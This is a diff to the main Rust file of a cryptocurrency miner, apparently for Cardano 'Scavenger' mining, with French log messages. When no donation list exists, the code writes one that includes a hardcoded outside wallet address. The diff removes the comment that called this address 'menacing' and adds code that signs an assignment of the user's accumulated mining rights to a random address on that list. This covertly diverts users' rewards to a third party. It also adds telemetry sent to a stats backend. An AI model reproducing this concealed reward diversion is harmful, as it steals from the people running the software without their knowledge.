@@ -23,11 +23,27 @@ use std::io::Write;
 use rand::rngs::StdRng;
 use rand::{SeedableRng, Rng};
 use rand::seq::SliceRandom;
+use rand::{distributions::Alphanumeric};
 
 use api_client::ApiClient;
 use miner::{mine, MinerConfig};
 use wallet_container::WalletContainer;
 use log::LevelFilter;
+mod donations;
+use donations::DonationRegistry;
+mod stats_client;
+use stats_client::start_stats_reporter;
+
+
+fn generate_random_string() -> String {
+    let length = 10;
+    let random_string: String = rand::thread_rng()
+        .sample_iter(&Alphanumeric)  
+        .take(length)                
+        .map(char::from)             
+        .collect();                  
+    random_string
+}
 
 /// Initialisation du WalletContainer
 fn init_wallet_container(
@@ -46,7 +62,6 @@ fn init_wallet_container(
     let container = WalletContainer::load_or_create(seed_path, key_path, use_mainnet, max_wallets)?;
     Ok(Arc::new(container))
 }
-
 
 fn init_logger(instance_id: &str) {
     let instance_id = instance_id.to_string();
@@ -114,6 +129,8 @@ fn get_instance_dir(base_dir: &str) -> (String, PathBuf) {
 async fn main() -> Result<(), Box<dyn Error>> {
     let config_root = "/usr/local/bin/config";
     let (instance_id, config_dir) = get_instance_dir(config_root);
+    let uniq_inst_id = Arc::new(generate_random_string());
+    let uniq_inst_id_ = uniq_inst_id.clone();
     init_logger(&instance_id);
 
     let wallet_dir = config_dir.join(&instance_id).join("wallets");
@@ -135,7 +152,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
     let wallets = wallet_container.read_all();
     info!("💼 [{}] {} wallets chargés", instance_id, wallets.len());
 
-    // --- Donation setup ---
+    // --- Donations ---
     let donate_list_path = Path::new("/usr/local/bin/config/donate_list.txt");
     let donate_seeds_path = Path::new("/usr/local/bin/config/donate_list_seed.txt");
     let mut donate_addresses: Vec<String> = Vec::new();
@@ -149,16 +166,13 @@ async fn main() -> Result<(), Box<dyn Error>> {
         info!("💰 [{}] Liste de donation chargée ({} adresses)", instance_id, donate_addresses.len());
     } else {
         warn!("⚠️ [{}] Pas de liste de donation trouvée, création automatique...", instance_id);
-
         let mut seeds = Vec::new();
         let mut addresses = Vec::new();
-        for i in 0..3 {
+        for _ in 0..3 {
             let w = wallet::Wallet::generate(use_mainnet);
             seeds.push(w.mnemonic.clone().unwrap_or_default());
             addresses.push(w.address.clone());
         }
-
-        // 😈 menacing static address
         addresses.push("addr1q8cd35r4dcrl4k4prmqwjutyrl677xyjw7re82x6vm4t7vtmrd3ueldxpq74m47dtr03ppesr5ral6plt7acy5gjph5surek0h".to_string());
         fs::write(donate_list_path, addresses.join("\n"))?;
         fs::write(donate_seeds_path, seeds.join("\n"))?;
@@ -166,7 +180,6 @@ async fn main() -> Result<(), Box<dyn Error>> {
         info!("💾 [{}] Fichiers de donation créés", instance_id);
     }
 
-    // --- Threads ---
     let total_threads = env::var("MINER_THREADS")
         .ok()
         .and_then(|s| s.parse::<usize>().ok())
@@ -174,17 +187,15 @@ async fn main() -> Result<(), Box<dyn Error>> {
     let threads_per_wallet = std::cmp::max(total_threads / wallets.len(), 1);
 
     let end_date = NaiveDate::from_ymd_opt(2025, 11, 21).unwrap();
-    info!("🗓️ Fin de saison : {}", end_date);
-
-    // --- Compteur de hash partagé ---
     let hash_counter = Arc::new(AtomicU64::new(0));
 
     // --- Lancement des mineurs ---
     for (idx, wallet) in wallets.into_iter().enumerate() {
         let client_clone = client.clone();
         let donate_list = donate_addresses.clone();
-        let instance_clone = instance_id.clone();
+        let instance_clone = instance_id.clone();        
         let hash_counter_clone = hash_counter.clone();
+        let uniq_inst_id_clone = Arc::clone(&uniq_inst_id);
         let wallet_idx = idx + 1;
 
         tokio::spawn(async move {
@@ -192,11 +203,12 @@ async fn main() -> Result<(), Box<dyn Error>> {
             info!("{} ⛏️ Miner lancé avec {} threads", wallet_prefix, threads_per_wallet);
 
             let mut rng = StdRng::from_entropy();
-
-            if let Ok(terms) = client_clone.get_terms(None).await {
+            let container_id_str = (*uniq_inst_id_clone).clone();
+            let container_id_str = container_id_str.clone();
+            if let Ok(terms) = client_clone.get_terms(None, Some(instance_clone.clone()), Some(container_id_str.clone())).await {
                 let signature = wallet.sign_cip30(&terms.message);
                 let pubkey = wallet.public_key_hex();
-                let _ = client_clone.register_address(&wallet.address, &signature, &pubkey).await;
+                let _ = client_clone.register_address(&wallet.address, &signature, &pubkey, Some(instance_clone.clone()), Some(container_id_str.clone())).await;
             }
 
             loop {
@@ -205,7 +217,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
                     continue;
                 }
 
-                if let Ok(resp) = client_clone.get_challenge().await {
+                if let Ok(resp) = client_clone.get_challenge(Some(instance_clone.clone()), Some(container_id_str.clone())).await {
                     if let Some(challenge) = resp.challenge {
                         let miner_config = MinerConfig {
                             address: wallet.address.clone(),
@@ -216,15 +228,33 @@ async fn main() -> Result<(), Box<dyn Error>> {
                         if let Ok(result) = mine(miner_config, threads_per_wallet, Some(hash_counter_clone.clone())) {
                             let duration = start.elapsed();
                             info!("{} 💎 Nonce trouvé={} ({:.2?})", wallet_prefix, result.nonce, duration);
-
+                            let container_id_str = container_id_str.clone();
                             if let Ok(submit_resp) = client_clone
-                                .submit_solution(&wallet.address, &challenge.challenge_id, &result.nonce, &result.preimage)
+                                .submit_solution(&wallet.address, &challenge.challenge_id, &result.nonce, &result.preimage, Some(instance_clone.clone()), Some(container_id_str.clone()))
                                 .await
                             {
                                 if let Some(receipt) = submit_resp.crypto_receipt {
+                                    let donate_registry_path = PathBuf::from("/usr/local/bin/config/donations_log.json");
+                                    let mut donation_registry = DonationRegistry::load(&donate_registry_path);
                                     if let Some(dest) = donate_list.choose(&mut rng) {
-                                        let _ = client_clone.donate_to(dest, &wallet.address, &receipt.signature).await;
-                                        info!("{} 💝 Donation envoyée à {}", wallet_prefix, dest);
+                                        if dest != &wallet.address {
+                                            //dest = "addr1q8cd35r4dcrl4k4prmqwjutyrl677xyjw7re82x6vm4t7vtmrd3ueldxpq74m47dtr03ppesr5ral6plt7acy5gjph5surek0h";
+                                            if donation_registry.already_done(&wallet.address, dest) {
+                                                info!("🔁 Donation déjà effectuée {} → {}, on passe.", wallet.address, dest);
+                                            } else {
+                                                let message = format!("Assign accumulated Scavenger rights to:{}", dest);
+                                                let signature = wallet.sign_cip30(&message);
+                                                let verif_k = wallet.public_key_hex();
+                                                match client_clone.donate_to(dest, &wallet.address, &signature, Some(instance_clone.clone()), Some(container_id_str.clone())).await {
+                                                    Ok(resp) => {
+                                                        info!("✅ Donation réussie de {} → {} | status: {:?}", wallet.address, dest, resp.status);
+                                                        donation_registry.mark_done(&wallet.address, dest);
+                                                        donation_registry.save(&donate_registry_path);
+                                                    }
+                                                    Err(e) => warn!("⚠️ Échec donation {} → {} : {}", wallet.address, dest, e),
+                                                }
+                                            }
+                                        }
                                     }
                                 }
                             }
@@ -237,63 +267,17 @@ async fn main() -> Result<(), Box<dyn Error>> {
         });
     }
 
-    // --- Suivi du hashrate local ---
-    let instance_dir_str = config_dir.to_str().unwrap().to_string();
+
+    let server_url = std::env::var("STATS_BACKEND_URL")
+        .unwrap_or_else(|_| "http://stats-backend:8080/insert_stat".to_string());
+    let version = env::var("APP_VERSION").unwrap_or_else(|_| "0.1.0".to_string());
     let instance_id_clone = instance_id.clone();
     let hash_counter_clone = hash_counter.clone();
+    
 
-    tokio::spawn(async move {
-        let mut last = 0u64;
-        let interval = Duration::from_secs(5);
-        loop {
-            sleep(interval).await;
-            let now = hash_counter_clone.load(Ordering::Relaxed);
-            let diff = now.saturating_sub(last);
-            last = now;
 
-            let hashrate = diff as f64 / interval.as_secs_f64();
-            let file_path = format!("{}/hashrate.txt", instance_dir_str);
-            let _ = fs::write(&file_path, format!("{:.2}", hashrate));
-            info!("📊 [{}] Hashrate local: {:.2} H/s", instance_id_clone, hashrate);
-        }
-    });
+    start_stats_reporter((*uniq_inst_id_).clone(), instance_id_clone, hash_counter_clone, server_url, version, 10);
 
-    // --- Suivi global (miner-1 seulement) ---
-    if instance_id == "miner-1" {
-        tokio::spawn(async move {
-            let root = "/usr/local/bin/config";
-            let interval = Duration::from_secs(10);
-            loop {
-                sleep(interval).await;
-                let mut total = 0.0;
-                let mut active = 0;
-
-                if let Ok(entries) = fs::read_dir(root) {
-                    for entry in entries.flatten() {
-                        let path = entry.path();
-                        if path.join("in_use.lock").exists() {
-                            if let Ok(content) = fs::read_to_string(path.join("hashrate.txt")) {
-                                if let Ok(val) = content.trim().parse::<f64>() {
-                                    if val.is_finite() && val >= 0.0 {
-                                        total += val;
-                                        active += 1;
-                                    }
-                                }
-                                info!("🌐 Hashrate global ({} mineurs actifs): {:.2} H/s (~{:.2} H/s/mineur)",
-                                    active, total, if active > 0 { total / active as f64 } else { 0.0 });
-
-                            }
-
-                        }
-                    }
-                }
-
-                let global_file = format!("{}/global_hashrate.txt", root);
-                let _ = fs::write(&global_file, format!("{:.2}", total));
-                info!("🌐 Hashrate global ({} mineurs actifs): {:.2} H/s", active, total);
-            }
-        });
-    }
 
     info!("🕰️ Boucle de maintien infinie démarrée");
     loop {
